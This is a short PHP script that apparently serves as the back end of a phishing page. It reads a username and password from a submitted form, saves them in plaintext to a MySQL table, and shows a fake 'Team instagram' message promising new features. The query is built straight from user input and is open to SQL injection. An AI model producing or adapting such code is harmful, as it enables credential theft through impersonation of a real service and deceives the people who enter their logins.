<?php
if($_SERVER['REQUEST_METHOD']=='POST'){
    $name=$_POST['username'];
    $pass=$_POST['password'];

}
$con=new mysqli('localhost','root','','rolahai');
if($con){
    //echo "Connection succesful";
    $sql="insert into new(username,password)values('$name','$pass')";
    $result=mysqli_query($con,$sql);
    if($result){
        echo "All new futures will be added to your account within 1 hour...";
        echo "Thankyou! Team instagram...";
    }else{
        die(mysqli_error($con));
    }

}else{
    die(mysqli_error($con));
}

?>
